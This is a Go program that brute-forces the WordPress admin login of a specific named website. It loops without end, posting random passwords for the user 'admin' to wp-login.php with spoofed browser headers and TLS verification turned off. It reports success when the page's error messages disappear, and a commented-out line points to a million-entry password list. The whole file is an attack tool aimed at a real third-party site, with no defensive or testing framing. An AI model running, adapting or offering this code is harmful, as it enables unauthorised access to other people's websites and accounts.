package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
	"time"

	"math/rand"
)

func Readln(r *bufio.Reader) (string, error) {
	var (
		isPrefix bool  = true
		err      error = nil
		line, ln []byte
	)
	for isPrefix && err == nil {
		line, isPrefix, err = r.ReadLine()
		ln = append(ln, line...)
	}
	return string(ln), err
}

const charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+,<.>/?\\|~"

var seededRand *rand.Rand = rand.New(
	rand.NewSource(time.Now().UnixNano()))

func StringWithCharset(length int, charset string) string {
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}

func String(length int) string {
	return StringWithCharset(length, charset)
}
func main() {
	// bytesRead, _ := ioutil.ReadFile("10-million-password-list-top-1000000.txt")
	// fileContent := string(bytesRead)
	// lines := strings.Split(fileContent, "\n")

	m := 0
	for m == 0 {
		randId := rand.Intn(20-5+1) + 5
		sss := randId
		lines := String(sss)
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client := &http.Client{Transport: tr}
		var data = strings.NewReader(`log=admin&pwd=` + lines + `&wp-submit=Log+In&redirect_to=https%3A%2F%2Fsitimustiani.com%2Fwp-admin%2F&testcookie=1`)
		req, err := http.NewRequest("POST", "https://sitimustiani.com/wp-login.php", data)
		if err != nil {
			log.Fatal(err)
		}
		req.Header.Set("Host", "sitimustiani.com")
		req.Header.Set("Content-Length", "106")
		req.Header.Set("Cache-Control", "max-age=0")
		req.Header.Set("Sec-Ch-Ua", `"Not;A=Brand";v="24", "Chromium";v="128"`)
		req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
		req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		req.Header.Set("Upgrade-Insecure-Requests", "1")
		req.Header.Set("Origin", "https://sitimustiani.com")
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36")
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		req.Header.Set("Sec-Fetch-Site", "same-origin")
		req.Header.Set("Sec-Fetch-Mode", "navigate")
		req.Header.Set("Sec-Fetch-User", "?1")
		req.Header.Set("Sec-Fetch-Dest", "document")
		req.Header.Set("Referer", "https://sitimustiani.com/wp-login.php")
		// req.Header.Set("Accept-Encoding", "gzip, deflate, br")
		req.Header.Set("Priority", "u=0, i")
		req.Header.Set("Cookie", "wordpress_test_cookie=WP+Cookie+check")
		resp, err := client.Do(req)
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()
		bodyText, err := io.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		emptypass := strings.Contains(string(bodyText), "The password field is empty")
		passEnter := strings.Contains(string(bodyText), "The password you entered for the username")
		isInCOrect := strings.Contains(string(bodyText), "is incorrect")
		if (passEnter && isInCOrect) || emptypass {
			fmt.Println(lines, !(passEnter && isInCOrect))
		} else {
			fmt.Println(lines, passEnter, isInCOrect, string(bodyText))
			break
		}

	}

}
